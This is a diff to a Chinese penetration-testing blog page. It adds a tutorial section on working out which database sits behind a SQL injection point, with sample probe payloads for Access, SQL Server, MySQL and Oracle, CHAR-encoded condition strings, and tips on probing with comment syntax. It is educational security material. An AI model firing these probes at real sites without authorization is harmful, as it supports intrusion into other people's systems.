@@ -188,6 +188,61 @@
 </ul></li>
 </ul>
 
+<h3 id="0x05-sql注入之判断数据库类型">0x05 SQL注入之判断数据库类型</h3>
+
+<ul>
+<li><p>常见手段</p>
+
+<ul>
+<li>扫描端口、指纹、抓包查看http头信息、在网址后面直接判断</li>
+</ul></li>
+
+<li><p>根据各数据库特有函数判断</p>
+
+<ul>
+<li><p>Access:</p>
+
+<pre><code>and (select count(*) from MSysAccessObjects)&gt;0   返回正常说明是access
+and exists(select count(*) from表)
+ID=1 and (select count (*) from sysobjects)&gt;0 返回异常
+ID=1 and (select count (*) from msysobjects)&gt;0返回异常
+</code></pre></li>
+
+<li><p>SQLServer:</p>
+
+<pre><code>and (select count(*) from sysobjects) &gt;0   返回正常说明是mssql
+ID=1 and (select count (*) from sysobjects)&gt;0 返回正常
+ID=1 and (select count (*) from msysobjects)&gt;0返回异常
+ID=1 and left(version(),1)=5%23  //红色字体也可能是4
+ID=1 and exists(select id from sysobjects)
+ID=1 and len(user)&gt;0 
+ID=1 CHAR(97)+CHAR(110)+CHAR(100)+CHAR(32)+CHAR(49)+CHAR(61)+CHAR(49)
+</code></pre></li>
+
+<li><p>MySQL:</p>
+
+<pre><code>and length(user())&gt;0   返回正常说明是MySQL
+id=2 and version()&gt;0 返回正常
+id=2 and length(user())&gt;0
+id=2 CHAR(97, 110, 100, 32, 49, 61, 49)
+</code></pre></li>
+
+<li><p>ORACLE:</p>
+
+<pre><code>ID=1  and '1'||'1’='11'
+ID=1  and 0&lt;&gt;(select count(*) from dual) 
+ID=1 CHR(97) || CHR(110) || CHR(100) || CHR(32) || CHR(49) || CHR(61) || CHR(49)
+</code></pre></li>
+</ul></li>
+
+<li><p>其他方法</p>
+
+<pre><code>&quot;/*&quot;是MySQL中的注释符，返回错误说明该注入点不是MySQL，继续提交如下查询字符：
+&quot;--&quot;是Oracle和MSSQL支持的注释符，如果返回正常，则说明为这两种数据库类型之一。继续提交如下查询字符：
+&quot;;&quot;是子句查询标识符，Oracle不支持多行查询，因此如果返回错误，则说明很可能是Oracle数据库。
+</code></pre></li>
+</ul>
+
                 
                 <div style="padding:10px 1px;">
                     <font color="FF0000">若未作声明则文章版权归本人所有，转载请注明原文链接：</font>
@@ -258,7 +313,7 @@
         
             <li style="list-style-type:none;">
                 <i class="fa fa-folder fa-fw"></i>
-                <a href="http://wyb0.com/topics/pentest" title="pentest">pentest(78)</a>
+                <a href="http://wyb0.com/topics/pentest" title="pentest">pentest(77)</a>
             </li>
         
             <li style="list-style-type:none;">
@@ -350,7 +405,7 @@
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/injection" title="injection">injection</a>
-                <sup>17</sup>
+                <sup>16</sup>
             </p>
         
             <p style="display:inline-block;">
